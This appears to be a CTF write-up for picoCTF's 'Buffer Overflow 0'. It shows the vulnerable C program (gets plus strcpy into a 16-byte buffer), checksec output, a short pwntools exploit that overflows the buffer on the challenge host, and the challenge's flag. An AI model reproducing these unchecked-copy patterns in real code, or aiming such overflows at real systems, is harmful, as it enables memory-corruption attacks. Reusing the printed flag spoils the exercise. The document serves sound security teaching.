---
title: Buffer Overflow 0
date: 2025-12-01 12:00:00
categories: [CTF, binary exploitation]
tags: [writeup, picoctf]
---

## Сhallenge Info
* Platform: picoCTF
* Category: binary exploitation
* Diffuculty: medium

## Challenge Description
Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/174/vuln). You can view source [here](https://artifacts.picoctf.net/c/174/vuln.c).

## Solution

First, let's analyze the binary using file and checksec commands:
```bash
┌──(kali㉿kali)-[~/picoCTF/pwn/bof_0]
└─$ file vuln                        
vuln: ELF 32-bit LSB pie executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=b53f59f147e1b0b087a736016a44d1db6dee530c, for GNU/Linux 3.2.0, not stripped
                                                                                                                                             
┌──(kali㉿kali)-[~/picoCTF/pwn/bof_0]
└─$ checksec --file=vuln    
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   84 Symbols        No    0               4           vuln
```
Now we know it's 32 bit binary without canary protection, which means we can overflow the buffer without worrying about canary. 

Now let's look at the source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```
Looks like if we trigger sigsegv, sigsegv_handler func will be called and print the flag. Let's look at vulnerabilities:

```c
gets(buf1);
```
gets is dangerous function in C, since it doesn't check the size of the buffer it writes to.
```c
vuln(buf1);

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}
```
The function vuln called with an argument buf1, which contains our input, then strcpy(buf2, input) copies our input into buf2, which can hold up to 16 byte.
Writing more more will cause sigsegv.

buf2 [16] + SAVED EIP [4]

We can write 16 bytes into buf2 + 4 more bytes to overwrite saved RIP, causing sigsegv. Let's give it a try:

## Exploit
```python
from pwn import *

HOST, PORT = 'saturn.picoctf.net', 62378

r = remote(HOST, PORT)

payload = b"A" * 16 # Overwrite buf2
payload += b"B" * 4 # Smash saved EIP

r.sendline(payload)

r.interactive()
```
Run it 
```bash
┌──(kali㉿kali)-[~]
└─$ python3 exploit.py
Input: picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```
## Flag
```
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```

